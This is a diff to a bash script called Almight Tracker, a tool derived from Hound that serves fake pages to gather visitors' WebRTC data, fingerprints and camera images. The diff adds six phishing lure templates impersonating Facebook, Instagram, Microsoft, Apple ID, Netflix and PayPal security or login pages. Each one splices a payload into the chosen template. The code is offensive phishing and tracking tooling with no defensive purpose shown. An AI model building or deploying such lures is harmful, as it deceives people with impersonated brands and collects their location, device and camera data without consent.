@@ -1,5 +1,5 @@
 #!/bin/bash
-# Almight Tracker v 0.3
+# Almight Tracker v 0.5
 # Enhanced by Almight
 # Original: Hound by TechChip
 
@@ -13,7 +13,7 @@ printf '  ███████ ██      ██ ████ ██ ██ �
 printf '  ██   ██ ██      ██  ██  ██ ██ ██    ██ ██   ██    ██    \n'
 printf '  ██   ██ ███████ ██      ██ ██  ██████  ██   ██    ██    \n\n'
 printf '\e[1;31m       ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀\n'                                                                                
-printf " \e[1;93m         Almight Tracker v0.4 - Advanced Edition\e[0m \n"
+printf " \e[1;93m         Almight Tracker v0.5 - Advanced Edition\e[0m \n"
 printf " \e[1;92m   WebRTC + Fingerprint + Camera + Multi-Template \e[0m \n"
 printf "\e[1;90m Advanced tool for information gathering with automatic Censys lookup.\e[0m \n"
 printf "\n"
@@ -141,8 +141,14 @@ printf "\e[1;92m[2]\e[0m Cloudflare Verification\n"
 printf "\e[1;92m[3]\e[0m Google Login\n"
 printf "\e[1;92m[4]\e[0m WhatsApp Security Alert\n"
 printf "\e[1;92m[5]\e[0m Google Security Team\n"
+printf "\e[1;92m[6]\e[0m Facebook Security Alert\n"
+printf "\e[1;92m[7]\e[0m Instagram Verification\n"
+printf "\e[1;92m[8]\e[0m Microsoft Security\n"
+printf "\e[1;92m[9]\e[0m Apple ID Verification\n"
+printf "\e[1;92m[10]\e[0m Netflix Login\n"
+printf "\e[1;92m[11]\e[0m PayPal Security\n"
 printf "\n"
-read -p $'\e[1;93mSelect template [1-5]: \e[0m' template_choice
+read -p $'\e[1;93mSelect template [1-11]: \e[0m' template_choice
 
 case $template_choice in
     2)
@@ -160,6 +166,30 @@ case $template_choice in
     5)
         printf "\e[1;92m[+] Using Google Security template\e[0m\n"
         sed -e '/tc_payload/r payload' templates/google_security.html > index.html
+        ;;
+    6)
+        printf "\e[1;92m[+] Using Facebook Security template\e[0m\n"
+        sed -e '/tc_payload/r payload' templates/facebook_security.html > index.html
+        ;;
+    7)
+        printf "\e[1;92m[+] Using Instagram Verification template\e[0m\n"
+        sed -e '/tc_payload/r payload' templates/instagram_verification.html > index.html
+        ;;
+    8)
+        printf "\e[1;92m[+] Using Microsoft Security template\e[0m\n"
+        sed -e '/tc_payload/r payload' templates/microsoft_security.html > index.html
+        ;;
+    9)
+        printf "\e[1;92m[+] Using Apple ID Verification template\e[0m\n"
+        sed -e '/tc_payload/r payload' templates/apple_verification.html > index.html
+        ;;
+    10)
+        printf "\e[1;92m[+] Using Netflix Login template\e[0m\n"
+        sed -e '/tc_payload/r payload' templates/netflix_login.html > index.html
+        ;;
+    11)
+        printf "\e[1;92m[+] Using PayPal Security template\e[0m\n"
+        sed -e '/tc_payload/r payload' templates/paypal_security.html > index.html
         ;;
     *)
         printf "\e[1;92m[+] Using ChatGPT template (default)\e[0m\n"
